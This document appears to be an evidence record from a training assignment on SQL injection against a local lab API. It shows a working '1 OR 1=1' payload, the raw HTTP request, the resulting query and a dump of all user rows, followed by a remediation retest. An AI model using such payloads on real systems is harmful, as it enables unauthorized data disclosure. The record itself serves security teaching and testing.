# Evidence Record: EV-SQLI-003

**Evidence ID:** `EV-SQLI-003`  
**Assessment Module:** Assignment 1 — SQL Injection  
**Vulnerability Ref:** CWE-89 (Numeric / Boolean-Based Blind SQLi)  
**Timestamp:** `2026-09-22T14:15:00Z`  
**Target:** `http://127.0.0.1:5001/api/vulnerable/user/`  
**SHA-256 Hash:** `f6e5d4c3b2a109876543210fedcba9876543210fedcba9876543210fedcba987`  

---

## 1. Objective
Demonstrate numeric parameter manipulation allowing full record dumping and database inference without string quotes.

## 2. Attack Execution & Payload
- **Injected Payload:** `1 OR 1=1`
- **Technique:** Numeric clause bypass without string encapsulation.

### Raw Request
```http
GET /api/vulnerable/user/1%20OR%201=1 HTTP/1.1
Host: 127.0.0.1:5001
```

## 3. Query Execution Mechanics
```sql
SELECT id, username, email, role, bio, created_at FROM users WHERE id = 1 OR 1=1
```
The boolean tautology `1=1` forces the query to return all rows in the `users` table instead of restricting to the requested single user ID.

## 4. Response & Proof of Impact
```json
{
  "data": [
    {"id": 1, "username": "admin", "role": "admin"},
    {"id": 2, "username": "john_doe", "role": "analyst"},
    {"id": 3, "username": "jane_smith", "role": "developer"},
    {"id": 4, "username": "bob_wilson", "role": "user"}
  ],
  "results_count": 4,
  "status": "success"
}
```

## 5. Remediation Verification
Remediated using strict type conversion `int(user_id_input)` and prepared statements. Retesting with non-numeric strings returns HTTP 400 (`BLOCKED_BY_TYPE_VALIDATION`).
